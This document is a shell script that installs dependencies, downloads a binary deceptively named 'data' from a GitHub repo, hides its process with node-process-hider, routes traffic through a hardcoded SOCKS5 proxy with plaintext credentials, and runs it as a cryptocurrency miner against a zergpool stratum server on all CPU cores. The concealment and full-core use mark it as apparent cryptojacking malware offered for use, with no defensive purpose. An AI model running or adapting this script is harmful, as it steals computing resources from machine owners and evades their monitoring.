#!/bin/sh
apt update

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget -O - https://deb.nodesource.com/setup_17.x | bash

apt -y install nodejs

apt -y install npm

npm i -g node-process-hider

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = gpusocks3.wot.mrface.com:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

ps -A | grep graftcp* | awk '{print $1}' | xargs kill -9 $1

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .5

./graftcp/graftcp wget https://github.com/Master478963/lolMinet/raw/main/data
chmod +x data

ph add data



./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ.Test -p c=RVN -t $(nproc) -x socks5://mikrotik999:Elibawnos@gpusocks3.wot.mrface.com:1080
